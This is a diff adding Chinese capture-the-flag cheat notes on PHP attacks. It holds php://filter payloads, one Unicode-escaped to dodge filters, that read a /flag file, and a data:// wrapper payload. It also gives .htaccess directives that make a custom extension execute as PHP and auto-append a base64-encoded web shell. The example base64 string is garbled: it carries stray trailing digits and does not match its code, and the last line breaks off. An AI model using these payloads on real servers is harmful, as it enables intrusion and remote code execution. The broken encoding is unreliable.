@@ -2,3 +2,11 @@
 php://filter/convert.base64-encode/resource=/flag 作者：很菜的wl https://www.bilibili.com/read/cv19301072/ 出处：bilibili
 {“page”:”ph\u0070://filter/read=convert.base64-encode/resource=/\u0066lag”}
 ?^.^=data://text/plain;charset=unicode,(●'◡'●)
+
+使用伪协议，上传.htaccess文件，设置使用php解析任意文件。例如，您可以在.htaccess文件中写入：
+AddType application/x-httpd-php .abc
+php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.abc"
+
+这样，您就可以把后缀为.abc的文件当作php解析，然后在shell.abc文件中写入用base64加密的一句话木马。例如，您可以把<?php phpinfo ();?>加密成PD9waHAgcGhwaW5mbygpOz8+12。
+
+使用其他字符代替“<?”，例如“<%”或“<#”，然后在.htaccess文件中设置相应的解析规则。例
